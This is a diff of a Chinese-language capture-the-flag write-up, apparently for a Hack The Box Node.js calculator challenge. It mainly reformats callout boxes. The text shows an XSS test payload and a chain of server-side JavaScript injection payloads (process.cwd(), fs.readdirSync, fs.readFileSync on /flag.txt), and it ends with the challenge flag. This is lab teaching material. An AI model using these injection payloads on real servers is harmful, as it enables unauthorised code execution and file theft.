@@ -120,9 +120,9 @@ module.exports = router;
 
 ### 2.Attempt
 #### 2.1 XSS
-:::info
-main.js 沒有對輸入的payload進行過濾，嘗試XSS
-:::
+> [!NOTE]
+> main.js 沒有對輸入的payload進行過濾，嘗試XSS
+
 ```payload
 55688+'<img src=chw onerror="alert(55688)">'
 ```
@@ -155,29 +155,28 @@ package.json
 
 
 ```
-:::info
-從package.json可以得知使用Node.js
-嘗試在JSON格式中注入Node.js指令
-:::
+> [!NOTE]
+> 從package.json可以得知使用Node.js\
+> 嘗試在JSON格式中注入Node.js指令 
 
 ```payload
 process.cwd()
 ```
 ![image](https://hackmd.io/_uploads/SyNXiCJZA.png)
-:::warning
-● process.cwd() 是 Node.js 中的一個函式，用於獲取當前工作目錄（Current Working Directory）的路徑。所謂當前工作目錄是指 Node.js 進程當前正在運行的目錄。
-:::
+> [!IMPORTANT]
+> ● process.cwd() 是 Node.js 中的一個函式，用於獲取當前工作目錄（Current Working Directory）的路徑。所謂當前工作目錄是指 Node.js 進程當前正在運行的目錄。
+
 > 成功得到Server回應
 
 ### 3. Node.js in JSON
-#### 3.1 require('fs')
+#### 3.1 Node.js require('fs')
 ```payload
 require('fs')
 ```
-![image](https://hackmd.io/_uploads/SyyZLCkbA.png)
-:::warning
-● require('fs') 是 Node.js 中用於引入文件系統模組的標準語法。文件系統模組（fs）允許 Node.js 應用程式直接與文件系統進行交互，包括讀取檔案、寫入檔案、刪除檔案等操作。
-:::
+![image](https://hackmd.io/_uploads/SyyZLCkbA.png)\
+> [!IMPORTANT]
+> ● require('fs') 是 Node.js 中用於引入文件系統模組的標準語法。文件系統模組（fs）允許 Node.js 應用程式直接與文件系統進行交互，包括讀取檔案、寫入檔案、刪除檔案等操作。
+
 #### 3.2 Browse /app
 前面透過process.cwd()當前目錄在/app，利用readdirSync讀取當前目錄下內容
 ```payload
@@ -195,9 +194,9 @@ require('fs').readdirSync('../').toString()
 ```payload
 require('fs').readFileSync("/flag.txt").toString()
 ```
-:::warning
-● require('fs').readFileSync() 是 Node.js 中用於同步讀取檔案的函式。它的作用是以同步的方式從檔案系統中讀取檔案的內容，並將其返回為字串或二進位緩衝區。
-:::
+> [!IMPORTANT]
+> ● require('fs').readFileSync() 是 Node.js 中用於同步讀取檔案的函式。它的作用是以同步的方式從檔案系統中讀取檔案的內容，並將其返回為字串或二進位緩衝區。
+
 ![image](https://hackmd.io/_uploads/S1VoR0k-0.png)
 
 > **FLAG: HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}**
